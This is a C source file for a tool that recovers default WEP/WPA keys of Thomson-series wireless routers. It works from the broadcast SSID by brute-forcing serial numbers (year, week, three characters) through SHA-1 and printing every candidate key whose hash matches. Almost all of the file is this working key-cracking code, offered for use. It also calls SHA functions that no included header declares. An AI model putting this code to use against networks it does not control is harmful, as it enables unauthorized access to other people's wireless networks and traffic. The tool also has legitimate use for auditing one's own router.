/*
   **************************************************************************
   *                                                                        *
   * Default WEP/WPA key generation for Thomson series wireless routers     *
   *                                                                        *
   *   Date:   March 15th 2008                                              *
   *   Author: Kevin Devine <wyse101@gmail.com>                             *
   *   WWW:    http://weiss.u40.hosting.digiweb.ie/                         *
   *                                                                        *
   *   Hacked on by arris69 for UPC variant support.                        *
   *                                                                        *
   *   ioerror added build benchmarking, merged several forks of the code,  *
   *   lots of code cleanup, build automation and initial android support.  *
   *                                                                        *
   **************************************************************************

*/

#include <ctype.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>

const unsigned char charTable[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const unsigned char hexTable[]="0123456789ABCDEF";
      unsigned char serial[13]={0x43,0x50,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

#define SERIAL_LENGTH 12
#define MAX_SSID_OCTETS 6
#define DEFAULT_KEY_SIZE 5
#define SHA1_LENGTH 20

#define hexmsb(x)(hexTable[((x & 0xf0) >> 4)])
#define hexlsb(x)(hexTable[ (x & 0x0f)])

void usage(char **argv) {

    fprintf(stdout,"\n\tUsage: %s [-vu] [-o <output file>] -i <ssid octets>\n"
                   "\n\t -i : SSID octets from Thomson router (2005-2010)"
                   "\n\t -u : Calculate keys for UPC variant of the Thomson router"
                   "\n\t -y : Calculate keys for a specific year rather than all years"
                   "\n\t -o : Specifies output file for potential keys"
                   "\n\t -v : Print extra key info to stdout when potential key found\n\n",*argv);
    exit(0);
}

/*
 * convert hexadecimal ssid string to binary
 * return 0 on error or binary length of string
 *
 */
unsigned int str2ssid(unsigned char ssid[],unsigned char *str) {

    unsigned char *p,*q = ssid;
    size_t len = strlen((char *)str);

    if( (len % 2) || (len > MAX_SSID_OCTETS) )
      return(0);

    for(p = str;(*p = toupper(*p)) && (strchr((const char *)hexTable,*p)) != 0;) {

      if(--len % 2) {
        *q = ((unsigned char*)strchr((const char *)hexTable,*p++) - hexTable);
        *q <<= 4;
      } else {
        *q++ |= ((unsigned char*)strchr((const char *)hexTable,*p++) - hexTable);
      }
    }
    return( (len) ? 0 : (p - str) / 2);
}

/*
 * print 5 bytes to output file
 *
 */
void dump_key(FILE *out, unsigned char *key) {

    unsigned int i;
    unsigned char *p = key;

    for(i = 0;i < DEFAULT_KEY_SIZE;i++)
      fprintf(out,"%.2X",*p++);

    fprintf(out,"\n");
}

int main(int argc, char **argv) {

    unsigned char sha1_digest[40]={0};
    unsigned char ssid[8]={0},buf[8]={0},year,week,x1,x2,x3;
    unsigned int keys = 0,ssidLen = 0,verbose = 0, opt = 0;
    unsigned char *strId = NULL;
    FILE *ofile = NULL;
    unsigned int year_target = 0;
    unsigned int year_max = 0; 

    SHA_CTX sha1_ctx;

    if(argc > 1) {
      while( (opt = getopt(argc, argv,"vuy:o:i:")) != -1) {

        switch(opt) {

          case 'i' :
            strId = (unsigned char *)optarg;
            break;

          case 'o' :
            if((ofile = fopen(optarg,"wb")) == NULL) {
              fprintf(stderr,"\nCannot open %s for output.\n",optarg);
              return(0);
            }
            break;

          case 'v' :
            verbose++;
            break;

          case 'u' :
            // Hex 0x30 is the specific ascii byte ('0') for the UPC variant
            serial[0] = 0x30;
            serial[1] = 0x30;
            break;
          case 'y' :
            sscanf(optarg, "%u", &year_target);
            if(year_target >= 5 && year_target <= 10) {
              break;
            }
            else {
              fprintf(stderr, "Invalid year selected: %u\n", year_target);
              usage(argv);
            }
          default:
            usage(argv);
        }
      }

      if(!strId) usage(argv);

      if(!(ssidLen = str2ssid(ssid,strId))) usage(argv);

      if(verbose)
        fprintf(stdout,"Generating keys..please wait\n");
        if (year_target) {
          year = year_target;
          year_max = year_target;
        } else {
          year = 5;
          year_max = 10;
        }
        // generate values only for 2005 - 2010
        for(;year <= year_max;year++) {
          if(verbose)
            fprintf(stdout,"Calculating keys for 20%02d...\n",year);

          serial[2] = (year / 10) + 48;
          serial[3] = (year % 10) + 48;

          // 52 weeks of the year
          for(week = 1;week <= 52;week++) {

            serial[4] = (week / 10) + 48;
            serial[5] = (week % 10) + 48;

            for(x1 = 0;x1 < 36;x1++) {

              serial[6] = hexmsb(charTable[x1]);
              serial[7] = hexlsb(charTable[x1]);

              for(x2 = 0;x2 < 36;x2++) {

                serial[8] = hexmsb(charTable[x2]);
                serial[9] = hexlsb(charTable[x2]);

                for(x3 = 0;x3 < 36;x3++) {

                  serial[10] = hexmsb(charTable[x3]);
                  serial[11] = hexlsb(charTable[x3]);

                  // hash serial number with sha-1
                  SHA1_Init(&sha1_ctx);
                  SHA1_Update(&sha1_ctx,serial,SERIAL_LENGTH);
                  SHA1_Final(&sha1_ctx,sha1_digest);

                  // compare SSID octets with last number of bytes supplied
                  if(memcmp(&sha1_digest[(SHA1_LENGTH-ssidLen)],ssid,ssidLen) == 0) {

                    keys++;

                    if(verbose) {

                      memcpy(buf,serial,6);

                      fprintf(stdout,
                              "Serial Number Year 20%02d: %s**%C%C%C - potential key = ",year,
                              buf,charTable[x1],charTable[x2],charTable[x3]);

                      dump_key(stdout,sha1_digest);
                    } else {
                      dump_key(stdout,sha1_digest);
                    }
                    if(ofile) {
                      dump_key(ofile,sha1_digest);
                    }
                  }
                }
              }
            }
          }
        }
      if(verbose)
        fprintf(stdout,"Found %d potential keys.\n",keys);

      if(ofile) fclose(ofile);
    }
    else {
        usage(argv);
    }
    return(0);
}
